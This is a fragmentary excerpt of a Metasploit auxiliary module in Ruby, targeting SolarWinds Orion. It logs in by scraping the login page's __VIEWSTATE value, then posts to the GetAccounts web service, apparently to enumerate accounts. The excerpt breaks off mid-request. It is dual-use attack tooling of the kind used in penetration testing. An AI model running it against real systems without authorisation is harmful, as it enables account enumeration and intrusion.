...
class MetasploitModule < Msf::Auxiliary
  ...
  def login(username, password)
    res = send_request_cgi('uri' => normalize_uri(target_uri.path, 'Orion', 'Login.aspx'))

    viewstate = Regexp.last_match(1) if res.body =~ /id="__VIEWSTATE" value="(.*)" \/>/
  ...
  def run
    ...
    send_request_cgi('uri' => normalize_uri(target_uri.path, 'Orion', 'Services', 'AccountManagement.asmx' '/GetAccounts'),
                     'method' => 'POST',
                     'vars_get' => {
